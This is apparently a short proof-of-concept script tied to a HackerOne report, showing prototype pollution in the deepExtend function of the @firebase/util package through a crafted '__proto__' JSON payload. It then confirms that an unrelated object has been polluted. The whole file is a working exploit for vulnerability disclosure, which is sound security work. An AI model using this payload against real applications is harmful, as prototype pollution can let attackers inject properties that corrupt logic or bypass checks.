//https://hackerone.com/reports/1001218

const utils = require('@firebase/util');
const assert = require('assert');

const obj = {};
const source = JSON.parse('{"__proto__":{"polluted":"yes"}}');
console.log("Before : " + obj.polluted);
utils.deepExtend({}, source);


console.log("After : " + obj.polluted)
assert(obj.polluted === "yes");
console.log("Payload success!")
